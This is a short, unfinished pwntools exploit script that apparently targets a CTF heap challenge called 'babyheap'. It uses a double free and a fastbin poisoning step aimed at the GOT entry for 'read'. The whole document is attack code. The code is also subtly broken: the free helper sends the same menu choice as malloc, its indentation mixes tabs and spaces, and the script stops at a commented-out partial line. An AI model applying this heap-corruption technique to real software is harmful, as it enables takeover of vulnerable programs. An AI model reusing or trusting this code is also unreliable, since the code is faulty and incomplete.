from pwn import *

def malloc(index, size,content):
	p.sendlineafter('> ','1')
	p.sendlineafter('index: ',str(index))
	p.sendlineafter('size: ',str(size))
	p.sendlineafter('content: ',str(content))		

def free(index):
	p.sendlineafter('> ','1')
        p.sendlineafter('index: ',str(index))

p = process('./babyheap')
e = ELF("./babyheap")
l = e.libc

malloc(0,20,1)
malloc(1,20,1)

free(0)
free(1)
free(0)

log.info(e.got['read'])
malloc(0,20,p64(e.got['read']))
malloc(0,20,1)
#malloc(0,


p.interactive()
